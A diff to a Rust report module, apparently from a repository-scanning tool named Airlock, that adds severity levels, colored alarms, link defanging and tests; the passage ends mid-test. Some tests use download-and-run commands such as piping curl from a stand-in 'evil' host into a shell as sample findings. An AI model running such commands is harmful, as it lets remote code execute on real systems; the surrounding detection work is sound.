@@ -3,58 +3,105 @@
 //! Being listed doesn't mean something is malicious. Nothing is filtered out
 //! for looking harmless, because that decision belongs to the user. Every check
 //! reports through `Report::add`, so new checks get the same treatment.
+//!
+//! Color codes come only from the palette here. All repository text is escaped
+//! before it is painted, so a repository can't send its own codes to a terminal.
 
 use crate::text::{Untrusted, escape};
 use std::collections::BTreeMap;
 use std::fmt;
+use std::io::IsTerminal;
 
 /// How many places are named per finding. All of them are still counted.
 const MAX_LOCATIONS: usize = 5;
+const MAX_CALLS_PER_FILE: usize = 50;
 /// A hostile repo could contain millions of unique addresses. Past this limit
 /// items are counted and the report says it is incomplete.
 const MAX_REPORT_BYTES: usize = 128 * 1024 * 1024;
 const ENTRY_OVERHEAD_BYTES: usize = 128;
+const LOCATION_COLUMN: usize = 67;
+const ALARM_WIDTH: usize = 92;
+const BYTES_PER_MB: f64 = 1_000_000.0;
 
-const LIMITS: &str = "
-Limits of this list
-  Only addresses written as plain text can be listed. Encoded, split up or
-  downloaded addresses will not appear.
-  A downloaded archive can leave out files that git clone would give you.
-  Being listed doesn't mean something is malicious, and not being listed
-  doesn't mean it is safe.
+/// How serious a section is.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
+pub enum Level {
+    Note,
+    Warning,
+    Danger,
+}
 
-This is a list for you to review, not a safety verdict.
-";
+impl Level {
+    const HIGHEST_FIRST: [Self; 3] = [Self::Danger, Self::Warning, Self::Note];
+
+    fn label(self) -> &'static str {
+        match self {
+            Self::Danger => "DANGER",
+            Self::Warning => "WARNING",
+            Self::Note => "NOTE",
+        }
+    }
+
+    fn meaning(self) -> &'static str {
+        match self {
+            Self::Danger => "could harm your computer if you run this repository",
+            Self::Warning => "check these before you trust this repository",
+            Self::Note => "listed so you can see them, not checked for safety",
+        }
+    }
+}
 
 /// The sections of a report, in printing order.
 ///
-/// The most important section prints last, right above the summary. A long
-/// list of harmless links can then never push it off the screen.
+/// The most serious section prints last, right above the summary and the alarm.
+/// A long list of harmless links can then never push it off the screen.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
 pub enum Kind {
     DocumentationAddress,
     LockfileAddress,
     MentionedAddress,
     LocalAddress,
+    KnownVulnerable,
     NotRead,
+    DependencyNotChecked,
     OpaqueFile,
+    AutoRun,
     IpAddress,
-    CallWithoutAddress,
     NetworkCall,
+    CallWithoutAddress,
+    HadMaliciousReleases,
+    DisguisedFile,
+    HidesConnection,
+    RunsHiddenCode,
+    AutoRunNetwork,
+    DownloadsAndRuns,
+    KnownMalicious,
 }
 
 impl Kind {
-    const ALL: [Self; 9] = [
-        Self::DocumentationAddress,
-        Self::LockfileAddress,
-        Self::MentionedAddress,
-        Self::LocalAddress,
-        Self::NotRead,
-        Self::OpaqueFile,
-        Self::IpAddress,
-        Self::CallWithoutAddress,
-        Self::NetworkCall,
-    ];
+    fn level(self) -> Level {
+        match self {
+            Self::DocumentationAddress
+            | Self::LockfileAddress
+            | Self::MentionedAddress
+            | Self::LocalAddress => Level::Note,
+            Self::KnownVulnerable
+            | Self::NotRead
+            | Self::DependencyNotChecked
+            | Self::OpaqueFile
+            | Self::AutoRun
+            | Self::IpAddress
+            | Self::NetworkCall
+            | Self::CallWithoutAddress
+            | Self::HadMaliciousReleases => Level::Warning,
+            Self::DisguisedFile
+            | Self::HidesConnection
+            | Self::RunsHiddenCode
+            | Self::AutoRunNetwork
+            | Self::DownloadsAndRuns
+            | Self::KnownMalicious => Level::Danger,
+        }
+    }
 
     fn title(self) -> &'static str {
         match self {
@@ -62,14 +109,27 @@ impl Kind {
             Self::LockfileAddress => "Addresses in lockfiles",
             Self::MentionedAddress => "Other addresses in code and config",
             Self::LocalAddress => "Local, private and reserved addresses",
-            Self::NotRead => "Entries Airlock did not read",
+            Self::KnownVulnerable => "Dependencies with known security bugs",
+            Self::NotRead => "Not checked: Airlock could not read these",
+            Self::DependencyNotChecked => "Dependencies not checked for known malware",
             Self::OpaqueFile => "Files Airlock cannot read inside",
-            Self::IpAddress => "IP addresses (some may be version numbers)",
-            Self::CallWithoutAddress => "Network calls with no visible address",
-            Self::NetworkCall => "Network calls to these addresses",
+            Self::AutoRun => "Runs automatically when installed or opened",
+            Self::IpAddress => "Raw IP addresses, some may be version numbers",
+            Self::NetworkCall => "Contacts these addresses",
+            Self::CallWithoutAddress => "Connects somewhere Airlock cannot see",
+            Self::HadMaliciousReleases => {
+                "Package has had malicious releases, check which version gets installed"
+            }
+            Self::DisguisedFile => "Program or archive disguised as another type of file",
+            Self::HidesConnection => "Hides where it connects to",
+            Self::RunsHiddenCode => "Decodes hidden code and runs it",
+            Self::AutoRunNetwork => "Contacts the internet automatically when installed or opened",
+            Self::DownloadsAndRuns => "Downloads code from the internet and runs it",
+            Self::KnownMalicious => "Known malicious package",
         }
     }
 
+    /// Whether the subject is one bare address, as opposed to a line of code.
     fn is_address(self) -> bool {
         matches!(
             self,
@@ -79,15 +139,170 @@ impl Kind {
                 | Self::LocalAddress
                 | Self::IpAddress
                 | Self::NetworkCall
+                | Self::AutoRunNetwork
         )
     }
 }
 
+/// The codes used to style a report. All empty when color is off.
+pub struct Palette {
+    is_color: bool,
+    danger_tag: &'static str,
+    warning_tag: &'static str,
+    note_tag: &'static str,
+    danger_title: &'static str,
+    warning_title: &'static str,
+    note_title: &'static str,
+    strong: &'static str,
+    dim: &'static str,
+    location: &'static str,
+    brand: &'static str,
+}
+
+const RESET: &str = "\x1b[0m";
+
+pub const PLAIN: Palette = Palette {
+    is_color: false,
+    danger_tag: "",
+    warning_tag: "",
+    note_tag: "",
+    danger_title: "",
+    warning_title: "",
+    note_title: "",
+    strong: "",
+    dim: "",
+    location: "",
+    brand: "",
+};
+
+pub const COLOR: Palette = Palette {
+    is_color: true,
+    danger_tag: "\x1b[1;97;41m",
+    warning_tag: "\x1b[1;30;43m",
+    note_tag: "\x1b[1;97;100m",
+    danger_title: "\x1b[1;91m",
+    // The plain yellow, because bright yellow can't be read on a light terminal.
+    warning_title: "\x1b[1;33m",
+    note_title: "\x1b[1;90m",
+    strong: "\x1b[1m",
+    dim: "\x1b[90m",
+    location: "\x1b[36m",
+    brand: "\x1b[1;30;47m",
+};
+
+impl Palette {
+    /// The palette for the terminal this program is running in. Color stays off
+    /// when output goes to a file or program, and wherever it might print as
+    /// garbage, so the labels must always make sense without it.
+    pub fn for_terminal() -> &'static Self {
+        let is_terminal = std::io::stdout().is_terminal();
+        let env = |name: &str| std::env::var_os(name).filter(|value| !value.is_empty());
+        let term = std::env::var("TERM").ok();
+
+        let windows_console_ok = env("WT_SESSION").is_some()
+            || env("TERM_PROGRAM").is_some()
+            || env("ConEmuANSI").is_some()
+            || term.is_some();
+
+        if wants_color(
+            is_terminal,
+            env("NO_COLOR").is_some(),
+            term.as_deref(),
+            cfg!(windows),
+            windows_console_ok,
+        ) {
+            &COLOR
+        } else {
+            &PLAIN
+        }
+    }
+
+    fn paint(&self, code: &str, text: &str) -> String {
+        if code.is_empty() {
+            text.to_string()
+        } else {
+            format!("{code}{text}{RESET}")
+        }
+    }
+
+    fn tag(&self, level: Level) -> String {
+        let code = match level {
+            Level::Danger => self.danger_tag,
+            Level::Warning => self.warning_tag,
+            Level::Note => self.note_tag,
+        };
+        if self.is_color {
+            self.paint(code, &format!(" {} ", level.label()))
+        } else {
+            format!("[{}]", level.label())
+        }
+    }
+
+    fn title(&self, level: Level, text: &str) -> String {
+        let code = match level {
+            Level::Danger => self.danger_title,
+            Level::Warning => self.warning_title,
+            Level::Note => self.note_title,
+        };
+        self.paint(code, text)
+    }
+
+    /// A full-width alarm line in color, or plain text without it.
+    fn alarm(&self, code: &str, text: &str) -> String {
+        if self.is_color {
+            self.paint(code, &format!("{text:<ALARM_WIDTH$}"))
+        } else {
+            text.to_string()
+        }
+    }
+}
+
+fn wants_color(
+    is_terminal: bool,
+    no_color: bool,
+    term: Option<&str>,
+    is_windows: bool,
+    windows_console_ok: bool,
+) -> bool {
+    if !is_terminal || no_color || term == Some("dumb") {
+        return false;
+    }
+    // Old Windows consoles print color codes as text.
+    if is_windows {
+        windows_console_ok
+    } else {
+        term.is_some()
+    }
+}
+
 /// Where something was found.
+#[derive(Clone, Copy)]
 pub struct At<'a> {
     pub path: &'a Untrusted,
     /// Absent for binary files, where line numbers mean nothing.
     pub line: Option<u64>,
+}
+
+/// A network call found in a file, kept so later checks can ask which files
+/// contact the internet.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Call {
+    pub group: String,
+    pub subject: String,
+    pub line: Option<u64>,
+}
+
+/// Facts about the scan, shown at the top of the report.
+pub struct ScanInfo<'a> {
+    pub name: &'a str,
+    pub commit: Option<&'a str>,
+    /// What a link named, such as `("branch", "main")` or `("tag", "v1.0")`.
+    pub reference: Option<(&'a str, &'a str)>,
+    /// The folder or file, when a link named one.
+    pub path: Option<&'a str>,
+    pub files: u64,
+    pub bytes: u64,
+    pub packages_checked: usize,
 }
 
 #[derive(PartialEq, Eq, PartialOrd, Ord)]
@@ -100,12 +315,16 @@ struct Key {
 #[derive(Default)]
 struct Entry {
     count: u64,
+    /// Shown beside the subject when it has no location, such as why a file
+    /// couldn't be read.
+    detail: Option<String>,
     locations: Vec<(Untrusted, Option<u64>)>,
 }
 
 /// Everything found so far.
 pub struct Report {
     entries: BTreeMap<Key, Entry>,
+    calls: BTreeMap<String, Vec<Call>>,
     retained_bytes: usize,
     budget_bytes: usize,
     not_listed: u64,
@@ -119,6 +338,7 @@ impl Report {
     fn with_budget(budget_bytes: usize) -> Self {
         Self {
             entries: BTreeMap::new(),
+            calls: BTreeMap::new(),
             retained_bytes: 0,
             budget_bytes,
             not_listed: 0,
@@ -157,66 +377,280 @@ impl Report {
         }
     }
 
+    /// Records a finding that has an explanation rather than a location.
+    pub fn add_detail(&mut self, kind: Kind, subject: &str, detail: &str) {
+        self.add(kind, "", subject, None);
+        let key = Key {
+            kind,
+            group: String::new(),
+            subject: subject.to_string(),
+        };
+        if let Some(entry) = self.entries.get_mut(&key) {
+            entry.detail = Some(detail.to_string());
+        }
+    }
+
     /// Records findings that had to be dropped before reaching the report.
     pub fn note_not_listed(&mut self, count: u64) {
         self.not_listed += count;
     }
+
+    /// Remembers a network call in a file, for checks that run after every file
+    /// has been read.
+    pub fn record_call(&mut self, path: &str, call: Call) {
+        let bytes = call.group.len() + call.subject.len() + ENTRY_OVERHEAD_BYTES;
+        if self.retained_bytes + bytes > self.budget_bytes {
+            return;
+        }
+        let calls = self.calls.entry(path.to_string()).or_default();
+        if calls.len() < MAX_CALLS_PER_FILE {
+            self.retained_bytes += bytes;
+            calls.push(call);
+        }
+    }
+
+    pub fn calls_in(&self, path: &str) -> Vec<Call> {
+        self.calls.get(path).cloned().unwrap_or_default()
+    }
+
+    pub fn has_findings(&self) -> bool {
+        !self.entries.is_empty() || self.not_listed > 0
+    }
+
+    fn count_at(&self, level: Level) -> usize {
+        self.entries
+            .keys()
+            .filter(|key| key.kind.level() == level)
+            .count()
+    }
+
+    /// The full report as text.
+    pub fn render(&self, info: &ScanInfo<'_>, palette: &Palette) -> String {
+        Rendered {
+            report: self,
+            info,
+            palette,
+        }
+        .to_string()
+    }
 }
 
-impl fmt::Display for Report {
+struct Rendered<'a> {
+    report: &'a Report,
+    info: &'a ScanInfo<'a>,
+    palette: &'a Palette,
+}
+
+impl fmt::Display for Rendered<'_> {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        self.write_header(f)?;
+        self.write_sections(f)?;
+        self.write_summary(f)?;
+        self.write_limits(f)?;
+        self.write_alarm(f)
+    }
+}
+
+impl Rendered<'_> {
+    fn write_header(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        let (info, palette) = (self.info, self.palette);
+        let field = |name: &str| palette.paint(palette.dim, &format!("{name:<8}"));
+
+        writeln!(
+            f,
+            "{} {}",
+            palette.paint(palette.brand, " AIRLOCK "),
+            palette.paint(palette.strong, info.name)
+        )?;
+        if let Some(commit) = info.commit {
+            writeln!(f, " {} {commit}", field("commit"))?;
+        }
+        if let Some((label, name)) = info.reference {
+            writeln!(f, " {} {}", field(label), escape(name))?;
+        }
+        if let Some(path) = info.path {
+            writeln!(f, " {} {}", field("path"), escape(path))?;
+        }
+        writeln!(
+            f,
+            " {} {} {}, {:.1} MB",
+            field("read"),
+            info.files,
+            if info.files == 1 { "file" } else { "files" },
+            info.bytes as f64 / BYTES_PER_MB
+        )?;
+        writeln!(
+            f,
+            " {} {} packages against the OSV malware database",
+            field("checked"),
+            info.packages_checked
+        )
+    }
+
+    fn write_sections(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        let palette = self.palette;
         let mut counts: BTreeMap<Kind, u64> = BTreeMap::new();
-        for key in self.entries.keys() {
+        for key in self.report.entries.keys() {
             *counts.entry(key.kind).or_default() += 1;
         }
 
         let mut section = None;
         let mut group = None;
-        for (key, entry) in &self.entries {
+        for (key, entry) in &self.report.entries {
             if section != Some(key.kind) {
-                writeln!(f, "\n{} ({})", key.kind.title(), counts[&key.kind])?;
+                let level = key.kind.level();
+                writeln!(
+                    f,
+                    "\n{} {} {}",
+                    palette.tag(level),
+                    palette.title(level, key.kind.title()),
+                    palette.paint(palette.dim, &format!("({})", counts[&key.kind]))
+                )?;
                 section = Some(key.kind);
                 group = None;
             }
             if !key.group.is_empty() && group != Some(key.group.as_str()) {
-                writeln!(f, "  {}", show_group(key))?;
+                writeln!(f, "  {}", palette.paint(palette.strong, &show_group(key)))?;
                 group = Some(key.group.as_str());
             }
-            writeln!(f, "    {}", show_subject(key))?;
+            self.write_entry(f, key, entry)?;
+        }
+        Ok(())
+    }
 
-            for (path, line) in &entry.locations {
-                match line {
-                    Some(line) => writeln!(f, "      {path}:{line}")?,
-                    None => writeln!(f, "      {path}")?,
-                }
-            }
-            let named = entry.locations.len() as u64;
-            if named > 0 && entry.count > named {
-                writeln!(f, "      ...and {} more places", entry.count - named)?;
-            }
+    fn write_entry(&self, f: &mut fmt::Formatter<'_>, key: &Key, entry: &Entry) -> fmt::Result {
+        let palette = self.palette;
+        let left = format!("    {}", show_subject(key));
+        let gap = " ".repeat(LOCATION_COLUMN.saturating_sub(left.chars().count()).max(2));
+
+        if let Some(detail) = &entry.detail {
+            let detail = palette.paint(palette.dim, &escape(detail));
+            return writeln!(f, "{left}{gap}{detail}");
         }
 
-        writeln!(f, "\nSummary")?;
-        for kind in Kind::ALL.iter().rev() {
-            let count = counts.get(kind).copied().unwrap_or(0);
-            writeln!(f, "  {}: {count}", kind.title())?;
+        let named = entry.locations.len() as u64;
+        let extra = entry.count.saturating_sub(named);
+        let more = if named > 0 && extra > 0 {
+            let places = if extra == 1 { "place" } else { "places" };
+            format!(
+                "  {}",
+                palette.paint(palette.dim, &format!("+{extra} more {places}"))
+            )
+        } else {
+            String::new()
+        };
+
+        let mut lines = entry.locations.iter().map(|(path, line)| match line {
+            Some(line) => format!("{path}:{line}"),
+            None => path.to_string(),
+        });
+        let Some(first) = lines.next() else {
+            return writeln!(f, "{left}");
+        };
+
+        let lines: Vec<String> = std::iter::once(first).chain(lines).collect();
+        let last = lines.len() - 1;
+        for (index, location) in lines.iter().enumerate() {
+            let shown = palette.paint(palette.location, location);
+            let suffix = if index == last { more.as_str() } else { "" };
+            if index == 0 {
+                writeln!(f, "{left}{gap}{shown}{suffix}")?;
+            } else {
+                writeln!(f, "{:LOCATION_COLUMN$}{shown}{suffix}", "")?;
+            }
         }
-        if self.not_listed > 0 {
+        Ok(())
+    }
+
+    fn write_summary(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        let palette = self.palette;
+        writeln!(f, "\n{}", palette.paint(palette.brand, " SUMMARY "))?;
+        for level in Level::HIGHEST_FIRST {
+            let count = format!("{:>4}", self.report.count_at(level));
+            writeln!(
+                f,
+                "{}  {}{}",
+                palette.paint(palette.strong, &count),
+                palette.title(level, &format!("{:<9}", level.label())),
+                level.meaning()
+            )?;
+        }
+        if self.report.not_listed > 0 {
             writeln!(
                 f,
                 "\nThis list is incomplete: {} more items were found but not listed.",
-                self.not_listed
+                self.report.not_listed
             )?;
         }
-        f.write_str(LIMITS)
+        Ok(())
+    }
+
+    fn write_limits(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        let palette = self.palette;
+        let mut lines = vec![
+            " Airlock read this repository in memory. None of its files were saved or run.",
+            " Only addresses written as plain text can be listed. Encoded, split up or",
+            " downloaded addresses will not appear. A downloaded archive can leave out files",
+            " that git clone would give you.",
+        ];
+        if self.info.path.is_some() {
+            lines.push(" Only this path was scanned, not the rest of the repository.");
+        }
+
+        writeln!(f)?;
+        for line in lines {
+            writeln!(f, "{}", palette.paint(palette.dim, line))?;
+        }
+        Ok(())
+    }
+
+    fn write_alarm(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        let palette = self.palette;
+        let dangers = self.report.count_at(Level::Danger);
+
+        let (code, lines) = if dangers > 0 {
+            let plural = if dangers == 1 { "finding" } else { "findings" };
+            (
+                palette.danger_tag,
+                [
+                    format!(
+                        "  DANGER: {dangers} dangerous {plural} in {}",
+                        self.info.name
+                    ),
+                    "  Do not install, build, run or open this repository unless you have checked"
+                        .to_string(),
+                    "  and trust every DANGER item above.".to_string(),
+                ],
+            )
+        } else {
+            (
+                palette.warning_tag,
+                [
+                    "  NO DANGER FOUND. THIS DOES NOT MEAN THE REPOSITORY IS SAFE.".to_string(),
+                    "  Airlock only recognizes known patterns, and malicious code can hide from it."
+                        .to_string(),
+                    "  Check the warnings above, and run code you don't trust in an isolated environment."
+                        .to_string(),
+                ],
+            )
+        };
+
+        writeln!(f)?;
+        if palette.is_color {
+            writeln!(f, "{}", palette.alarm(code, ""))?;
+        }
+        for line in &lines {
+            writeln!(f, "{}", palette.alarm(code, line))?;
+        }
+        if palette.is_color {
+            writeln!(f, "{}", palette.alarm(code, ""))?;
+        }
+        Ok(())
     }
 }
 
 fn show_group(key: &Key) -> String {
-    if !key.kind.is_address() {
-        return escape(&key.group);
-    }
-    let shown = escape(&defang(&key.group));
+    let shown = escape(&key.group.replace('.', "[.]"));
     // These can imitate a familiar name letter for letter.
     if key.group.is_ascii() {
         shown
@@ -226,28 +660,39 @@ fn show_group(key: &Key) -> String {
 }
 
 fn show_subject(key: &Key) -> String {
-    if key.kind.is_address() {
-        escape(&defang(&key.subject))
+    let bare_address = key.kind.is_address() && !key.subject.contains(char::is_whitespace);
+    if bare_address && !key.subject.contains("://") {
+        escape(&key.subject.replace('.', "[.]"))
     } else {
-        escape(&key.subject)
+        escape(&defang_links(&key.subject))
     }
 }
 
-/// Rewrites an address so a terminal won't turn it into a clickable link. A
-/// report about suspicious addresses must not make them one click away.
-fn defang(address: &str) -> String {
-    match address.split_once("://") {
-        Some((scheme, rest)) => {
-            let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
-            let (authority, tail) = rest.split_at(end);
-            format!(
-                "{scheme}[://]{}{}",
-                authority.replace('.', "[.]"),
-                tail.replace("://", "[://]")
-            )
-        }
-        None => address.replace('.', "[.]"),
+/// Rewrites links so a terminal won't make them clickable. A report about
+/// suspicious addresses must not make them one click away.
+fn defang_links(text: &str) -> String {
+    let mut shown = String::with_capacity(text.len());
+    let mut rest = text;
+
+    while let Some(at) = rest.find("://") {
+        shown.push_str(&rest[..at]);
+        shown.push_str("[://]");
+        rest = &rest[at + 3..];
+
+        let end = rest
+            .find(|c: char| {
+                c.is_whitespace()
+                    || matches!(
+                        c,
+                        '/' | '?' | '#' | '"' | '\'' | '`' | '(' | ')' | '<' | '>'
+                    )
+            })
+            .unwrap_or(rest.len());
+        shown.push_str(&rest[..end].replace('.', "[.]"));
+        rest = &rest[end..];
     }
+    shown.push_str(rest);
+    shown
 }
 
 #[cfg(test)]
@@ -276,11 +721,40 @@ impl Report {
             .find(|key| key.kind == kind && key.subject == subject)
             .map(|key| key.group.clone())
     }
+
+    pub fn detail_of(&self, kind: Kind, subject: &str) -> Option<String> {
+        self.entries
+            .iter()
+            .find(|(key, _)| key.kind == kind && key.subject == subject)
+            .and_then(|(_, entry)| entry.detail.clone())
+    }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    const ALL_KINDS: [Kind; 19] = [
+        Kind::DocumentationAddress,
+        Kind::LockfileAddress,
+        Kind::MentionedAddress,
+        Kind::LocalAddress,
+        Kind::KnownVulnerable,
+        Kind::NotRead,
+        Kind::DependencyNotChecked,
+        Kind::OpaqueFile,
+        Kind::AutoRun,
+        Kind::IpAddress,
+        Kind::NetworkCall,
+        Kind::CallWithoutAddress,
+        Kind::HadMaliciousReleases,
+        Kind::DisguisedFile,
+        Kind::HidesConnection,
+        Kind::RunsHiddenCode,
+        Kind::AutoRunNetwork,
+        Kind::DownloadsAndRuns,
+        Kind::KnownMalicious,
+    ];
 
     fn path(name: &str) -> Untrusted {
         Untrusted::from_bytes(name.as_bytes())
@@ -293,6 +767,43 @@ mod tests {
         })
     }
 
+    fn info() -> ScanInfo<'static> {
+        ScanInfo {
+            name: "github.com/o/r",
+            commit: Some("abc123"),
+            reference: None,
+            path: None,
+            files: 214,
+            bytes: 1_300_000,
+            packages_checked: 12,
+        }
+    }
+
+    fn plain(report: &Report) -> String {
+        report.render(&info(), &PLAIN)
+    }
+
+    /// Removes the palette's own codes, leaving any that came from elsewhere.
+    fn strip_palette_codes(text: &str) -> String {
+        let mut stripped = text.to_string();
+        for code in [
+            COLOR.danger_tag,
+            COLOR.warning_tag,
+            COLOR.note_tag,
+            COLOR.danger_title,
+            COLOR.warning_title,
+            COLOR.note_title,
+            COLOR.strong,
+            COLOR.dim,
+            COLOR.location,
+            COLOR.brand,
+            RESET,
+        ] {
+            stripped = stripped.replace(code, "");
+        }
+        stripped
+    }
+
     #[test]
     fn lists_every_finding_however_many_there_are() {
         let file = path("a.js");
@@ -302,7 +813,7 @@ mod tests {
             report.add(Kind::MentionedAddress, "", &url, at(&file, number));
         }
 
-        let shown = report.to_string();
+        let shown = plain(&report);
 
         for number in 0..500 {
             assert!(
@@ -321,15 +832,55 @@ mod tests {
             report.add(Kind::NetworkCall, "", "https://a.example", at(&file, line));
         }
 
-        let shown = report.to_string();
+        let shown = plain(&report);
 
         assert!(shown.contains("a.js:5"));
         assert!(!shown.contains("a.js:6"));
-        assert!(shown.contains("...and 3 more places"));
+        assert!(shown.contains("+3 more places"));
         assert_eq!(
             report.listed(Kind::NetworkCall),
             [("https://a.example".to_string(), 8)]
         );
+    }
+
+    #[test]
+    fn says_place_for_one_extra_location() {
+        let file = path("a.js");
+        let mut report = Report::new();
+        for line in 1..=6 {
+            report.add(Kind::NetworkCall, "", "https://a.example", at(&file, line));
+        }
+
+        assert!(plain(&report).contains("+1 more place\n"));
+    }
+
+    #[test]
+    fn keeps_the_location_beside_the_address() {
+        let file = path("README.md");
+        let mut report = Report::new();
+        report.add(
+            Kind::DocumentationAddress,
+            "docs.rs",
+            "https://docs.rs/tokio",
+            at(&file, 12),
+        );
+
+        let shown = plain(&report);
+        let line = shown.lines().find(|line| line.contains("tokio")).unwrap();
+
+        assert!(line.ends_with("README.md:12"));
+        assert_eq!(line.find("README.md"), Some(LOCATION_COLUMN));
+    }
+
+    #[test]
+    fn shows_a_detail_beside_a_finding_without_a_location() {
+        let mut report = Report::new();
+        report.add_detail(Kind::NotRead, "assets/big.bin", "too large (5 bytes)");
+
+        let shown = plain(&report);
+        let line = shown.lines().find(|line| line.contains("big.bin")).unwrap();
+
+        assert!(line.ends_with("too large (5 bytes)"));
     }
 
     #[test]
@@ -341,14 +892,14 @@ mod tests {
         report.add(Kind::DocumentationAddress, "", url, at(&readme, 1));
         report.add(Kind::NetworkCall, "", url, at(&script, 9));
 
-        let shown = report.to_string();
+        let shown = plain(&report);
 
         assert!(shown.contains("README.md:1"));
         assert!(shown.contains("install.js:9"));
     }
 
     #[test]
-    fn the_most_important_section_prints_last_above_the_summary() {
+    fn the_most_serious_section_prints_last_above_the_summary_and_alarm() {
         let file = path("a.js");
         let mut report = Report::new();
         report.add(
@@ -358,22 +909,135 @@ mod tests {
             at(&file, 1),
         );
         report.add(Kind::NetworkCall, "", "https://c.example", at(&file, 2));
+        report.add(Kind::KnownMalicious, "", "bad 1.0 (npm)", at(&file, 3));
 
-        let shown = report.to_string();
+        let shown = plain(&report);
         let docs = shown.find("Addresses in documentation (1)").unwrap();
-        let calls = shown.find("Network calls to these addresses (1)").unwrap();
-        let summary = shown.find("\nSummary").unwrap();
+        let calls = shown.find("Contacts these addresses (1)").unwrap();
+        let malicious = shown.find("Known malicious package (1)").unwrap();
+        let summary = shown.find(" SUMMARY ").unwrap();
+        let alarm = shown.find("DANGER: 1 dangerous finding in").unwrap();
 
-        assert!(docs < calls && calls < summary);
+        assert!(docs < calls && calls < malicious && malicious < summary && summary < alarm);
     }
 
     #[test]
-    fn the_summary_names_every_section_even_when_empty() {
-        let shown = Report::new().to_string();
+    fn labels_each_section_by_how_serious_it_is() {
+        let file = path("a.js");
+        let mut report = Report::new();
+        report.add(Kind::DocumentationAddress, "", "x", at(&file, 1));
+        report.add(Kind::NetworkCall, "", "x", at(&file, 1));
+        report.add(Kind::DownloadsAndRuns, "", "x", at(&file, 1));
 
-        for kind in Kind::ALL {
-            assert!(shown.contains(&format!("{}: 0", kind.title())), "{kind:?}");
+        let shown = plain(&report);
+
+        assert!(shown.contains("[NOTE] Addresses in documentation"));
+        assert!(shown.contains("[WARNING] Contacts these addresses"));
+        assert!(shown.contains("[DANGER] Downloads code from the internet and runs it"));
+    }
+
+    #[test]
+    fn every_kind_has_a_level_and_title_and_prints_in_level_order() {
+        let mut previous = Level::Note;
+        for kind in ALL_KINDS {
+            assert!(kind.level() >= previous, "{kind:?} is out of order");
+            assert!(!kind.title().is_empty());
+            previous = kind.level();
         }
+    }
+
+    #[test]
+    fn a_danger_finding_raises_the_alarm_and_tells_people_not_to_run_it() {
+        let file = path("a.js");
+        let mut report = Report::new();
+        report.add(Kind::DownloadsAndRuns, "", "curl x | sh", at(&file, 1));
+        report.add(Kind::DownloadsAndRuns, "", "curl y | sh", at(&file, 2));
+
+        let shown = plain(&report);
+
+        assert!(shown.contains("DANGER: 2 dangerous findings in github.com/o/r"));
+        assert!(shown.contains("Do not install, build, run or open this repository"));
+        assert!(!shown.contains("NO DANGER FOUND"));
+    }
+
+    #[test]
+    fn no_danger_never_reads_as_safe() {
+        let file = path("a.js");
+        let mut report = Report::new();
+        report.add(Kind::NetworkCall, "", "https://a.example", at(&file, 1));
+
+        let shown = plain(&report);
+
+        assert!(shown.contains("NO DANGER FOUND. THIS DOES NOT MEAN THE REPOSITORY IS SAFE."));
+        assert!(!shown.contains("Do not install"));
+    }
+
+    #[test]
+    fn the_alarm_is_the_last_thing_in_the_report() {
+        let shown = plain(&Report::new());
+
+        assert!(
+            shown
+                .trim_end()
+                .ends_with("run code you don't trust in an isolated environment.")
+        );
+    }
+
+    #[test]
+    fn the_summary_counts_findings_by_level() {
+        let file = path("a.js");
+        let mut report = Report::new();
+        report.add(Kind::KnownMalicious, "", "a", at(&file, 1));
+        report.add(Kind::NetworkCall, "", "b", at(&file, 1));
+        report.add(Kind::NetworkCall, "", "c", at(&file, 1));
+        report.add(Kind::DocumentationAddress, "", "d", at(&file, 1));
+
+        let shown = plain(&report);
+
+        assert!(shown.contains("   1  DANGER   could harm your computer"));
+        assert!(shown.contains("   2  WARNING  check these"));
+        assert!(shown.contains("   1  NOTE     listed so you can see them"));
+    }
+
+    #[test]
+    fn the_header_describes_the_scan() {
+        let shown = plain(&Report::new());
+
+        assert!(shown.contains(" AIRLOCK  github.com/o/r"));
+        assert!(shown.contains("commit   abc123"));
+        assert!(shown.contains("read     214 files, 1.3 MB"));
+        assert!(shown.contains("checked  12 packages against the OSV malware database"));
+        assert!(!shown.contains(" path "));
+    }
+
+    #[test]
+    fn says_when_only_part_of_a_repository_was_scanned() {
+        let mut info = info();
+        info.reference = Some(("branch", "main"));
+        info.path = Some("erc20-token-dapp");
+
+        let shown = Report::new().render(&info, &PLAIN);
+
+        assert!(shown.contains("branch   main"));
+        assert!(shown.contains("path     erc20-token-dapp"));
+        assert!(shown.contains("Only this path was scanned, not the rest of the repository."));
+    }
+
+    #[test]
+    fn says_one_file_rather_than_one_files() {
+        let mut info = info();
+        info.files = 1;
+
+        assert!(
+            Report::new()
+                .render(&info, &PLAIN)
+                .contains("read     1 file, 1.3 MB")
+        );
+    }
+
+    #[test]
+    fn says_it_read_files_in_memory_and_ran_nothing() {
+        assert!(plain(&Report::new()).contains("None of its files were saved or run."));
     }
 
     #[test]
@@ -387,14 +1051,39 @@ mod tests {
             at(&file, 1),
         );
         report.add(Kind::IpAddress, "", "1.1.1.1", at(&file, 2));
+        report.add(
+            Kind::DownloadsAndRuns,
+            "",
+            "curl -s https://evil.example/x.sh | sh",
+            at(&file, 3),
+        );
 
-        let shown = report.to_string();
+        let shown = plain(&report);
 
-        assert!(shown.contains("https[://]evil[.]example/a.b?next=https[://]other.example/"));
-        assert!(shown.contains("evil[.]example"));
+        assert!(shown.contains("https[://]evil[.]example/a.b?next=https[://]other[.]example/"));
+        assert!(shown.contains("  evil[.]example\n"));
         assert!(shown.contains("1[.]1[.]1[.]1"));
+        assert!(shown.contains("curl -s https[://]evil[.]example/x.sh | sh"));
         assert!(!shown.contains("://evil"));
         assert!(!shown.contains("https://"));
+    }
+
+    #[test]
+    fn ordinary_code_is_left_readable() {
+        let file = path("a.js");
+        let mut report = Report::new();
+        report.add(
+            Kind::CallWithoutAddress,
+            "",
+            "axios(config.url)",
+            at(&file, 1),
+        );
+        report.add(Kind::AutoRunNetwork, "", "node install.js", at(&file, 2));
+
